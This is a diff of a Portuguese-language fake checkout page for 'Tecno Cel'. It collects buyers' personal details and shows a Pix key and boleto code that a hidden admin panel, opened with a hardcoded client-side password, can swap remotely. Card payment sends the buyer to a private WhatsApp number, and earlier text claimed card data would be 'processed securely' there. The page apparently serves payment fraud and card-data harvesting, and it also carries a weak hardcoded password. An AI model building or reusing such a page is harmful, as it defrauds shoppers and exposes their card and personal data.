@@ -2,13 +2,13 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Tecno Cel • Finalizar Compra</title>
+<title>Tecno Cel • Pagamento</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
 *{box-sizing:border-box}
 body{
-  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial;
+  font-family:Arial,Helvetica,sans-serif;
   background:#f2f4f7;
   margin:0;
   min-height:100vh;
@@ -20,8 +20,8 @@ body{
   background:#fff;
   width:100%;
   max-width:420px;
-  border-radius:18px;
-  box-shadow:0 20px 45px rgba(0,0,0,.08);
+  border-radius:16px;
+  box-shadow:0 20px 40px rgba(0,0,0,.1);
   overflow:hidden;
   position:relative;
 }
@@ -30,70 +30,42 @@ body{
   text-align:center;
   border-bottom:1px solid #eee;
 }
-.logo{
-  font-size:22px;
-  font-weight:700;
-}
-.price{
-  font-size:28px;
-  color:#2e7d32;
-  font-weight:700;
-  margin-top:6px;
-}
+.logo{font-size:22px;font-weight:700}
 .page{display:none;padding:20px}
 .page.active{display:block}
-
-input{
+input,button{
   width:100%;
   padding:12px;
   margin-top:10px;
   border-radius:10px;
-  border:1px solid #ccc;
 }
+input{border:1px solid #ccc}
 button{
-  width:100%;
-  padding:14px;
-  margin-top:16px;
   border:none;
-  border-radius:12px;
   background:#2e7d32;
   color:#fff;
-  font-size:16px;
   font-weight:600;
-  cursor:pointer;
 }
-.back{background:#eef1f4;color:#333}
-
 .option{
   border:1px solid #ddd;
-  border-radius:14px;
-  padding:16px;
-  margin-top:14px;
-  display:flex;
-  justify-content:space-between;
+  border-radius:12px;
+  padding:14px;
+  margin-top:12px;
   cursor:pointer;
 }
-.option:hover{border-color:#2e7d32;background:#f6fff8}
-
+.option:hover{background:#f6fff8}
 .code{
   background:#f7f9fc;
   border:1px dashed #cfd8dc;
-  padding:14px;
-  border-radius:12px;
+  padding:12px;
+  border-radius:10px;
   word-break:break-all;
-  font-size:13px;
-  margin-top:10px;
 }
-.secure{
-  text-align:center;
-  font-size:12px;
-  color:#777;
-  margin-top:14px;
-}
+.back{background:#eee;color:#333}
 .admin-btn{
   position:absolute;
-  top:12px;
-  right:12px;
+  top:10px;
+  right:10px;
   opacity:.15;
   cursor:pointer;
 }
@@ -107,69 +79,63 @@ button{
 <div class="admin-btn" onclick="abrirAdmin()">⚙️</div>
 
 <div class="header">
-  <div class="logo" id="empresaNome">Tecno Cel</div>
-  <small>Checkout seguro</small>
-  <div class="price">R$ 99,90</div>
+  <div class="logo" id="empresa">Tecno Cel</div>
+  <small>Pagamento seguro</small>
 </div>
 
-<!-- FORMULÁRIO -->
 <div id="form" class="page active">
   <input id="nome" placeholder="Nome completo">
   <input id="telefone" placeholder="Telefone">
-  <input id="endereco" placeholder="Endereço completo">
+  <input id="endereco" placeholder="Endereço">
   <button onclick="continuar()">Continuar</button>
-  <div class="secure">🔒 Seus dados são usados apenas para esta compra</div>
 </div>
 
-<!-- MÉTODOS -->
-<div id="home" class="page">
-  <div class="option" onclick="show('pix')">🔑 Pix <span>Imediato</span></div>
-  <div class="option" onclick="show('boleto')">🧾 Boleto <span>Até 2 dias úteis</span></div>
-  <div class="option" onclick="pagamentoCartao()">💳 Cartão <span>WhatsApp</span></div>
+<div id="metodos" class="page">
+  <div class="option" onclick="show('pix')">🔑 Pix</div>
+  <div class="option" onclick="show('boleto')">🧾 Boleto</div>
+  <div class="option" onclick="cartao()">💳 Cartão (WhatsApp)</div>
 </div>
 
-<!-- PIX -->
 <div id="pix" class="page">
   <h3>Chave Pix</h3>
-  <div class="code" id="pixKey"></div>
+  <div class="code" id="pixKey">carregando...</div>
   <button onclick="copiar('pixKey')">Copiar Pix</button>
-  <button class="back" onclick="show('home')">Voltar</button>
+  <button class="back" onclick="show('metodos')">Voltar</button>
 </div>
 
-<!-- BOLETO -->
 <div id="boleto" class="page">
   <h3>Código do Boleto</h3>
-  <div class="code" id="boletoKey"></div>
+  <div class="code" id="boletoKey">carregando...</div>
   <button onclick="copiar('boletoKey')">Copiar Boleto</button>
-  <button class="back" onclick="show('home')">Voltar</button>
+  <button class="back" onclick="show('metodos')">Voltar</button>
 </div>
 
-<!-- ADMIN -->
 <div id="admin" class="page">
-  <input id="adminEmpresa" placeholder="Nome da empresa">
-  <input id="adminPix" placeholder="Chave Pix">
-  <input id="adminBoleto" placeholder="Código do boleto">
-  <input id="adminSenha" type="password" placeholder="Senha admin">
-  <button onclick="salvarAdmin()">Salvar alterações</button>
+  <input id="aEmpresa" placeholder="Empresa">
+  <input id="aPix" placeholder="Pix">
+  <input id="aBoleto" placeholder="Boleto">
+  <input id="aSenha" type="password" placeholder="Senha">
+  <button onclick="salvar()">Salvar</button>
   <button class="back" onclick="show('form')">Fechar</button>
 </div>
 
 </div>
 
 <script>
-const API = 'https://troca-api.onrender.com';
-let dadosCliente = {};
+const API='https://troca-api.onrender.com';
+let dados={};
 
 fetch(API+'/config')
 .then(r=>r.json())
 .then(c=>{
-  empresaNome.innerText = c.empresa;
-  pixKey.innerText = c.pix;
-  boletoKey.innerText = c.boleto;
-  adminEmpresa.value = c.empresa;
-  adminPix.value = c.pix;
-  adminBoleto.value = c.boleto;
-});
+  empresa.innerText=c.empresa;
+  pixKey.innerText=c.pix;
+  boletoKey.innerText=c.boleto;
+  aEmpresa.value=c.empresa;
+  aPix.value=c.pix;
+  aBoleto.value=c.boleto;
+})
+.catch(()=>{});
 
 function show(id){
   document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
@@ -177,48 +143,33 @@ function show(id){
 }
 
 function continuar(){
-  dadosCliente = {
-    nome:nome.value,
-    telefone:telefone.value,
-    endereco:endereco.value
-  };
-  show('home');
+  dados={nome:nome.value,telefone:telefone.value,endereco:endereco.value};
+  show('metodos');
 }
 
 function copiar(id){
   navigator.clipboard.writeText(document.getElementById(id).innerText);
-  alert('Copiado com sucesso');
+  alert('Copiado');
 }
 
-function pagamentoCartao(){
-  const msg = `
-Pagamento via CARTÃO - Tecno Cel
-
-Nome: ${dadosCliente.nome}
-Telefone: ${dadosCliente.telefone}
-Endereço de entrega: ${dadosCliente.endereco}
-
-⚠️ Os dados do cartão serão enviados neste WhatsApp
-e processados com segurança pela Gateway Online.
-`;
-  window.location.href =
-    'https://wa.me/5516981095904?text=' + encodeURIComponent(msg);
+function cartao(){
+  const msg=`Pagamento via cartão\nNome:${dados.nome}\nTelefone:${dados.telefone}\nEndereço:${dados.endereco}`;
+  location.href='https://wa.me/5516981095904?text='+encodeURIComponent(msg);
 }
 
 function abrirAdmin(){
-  const s = prompt('Senha admin');
-  if(s === '001533') show('admin');
+  if(prompt('Senha')==='001533') show('admin');
 }
 
-function salvarAdmin(){
+function salvar(){
   fetch(API+'/config',{
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body:JSON.stringify({
-      empresa:adminEmpresa.value,
-      pix:adminPix.value,
-      boleto:adminBoleto.value,
-      senha:adminSenha.value
+      empresa:aEmpresa.value,
+      pix:aPix.value,
+      boleto:aBoleto.value,
+      senha:aSenha.value
     })
   }).then(()=>location.reload());
 }
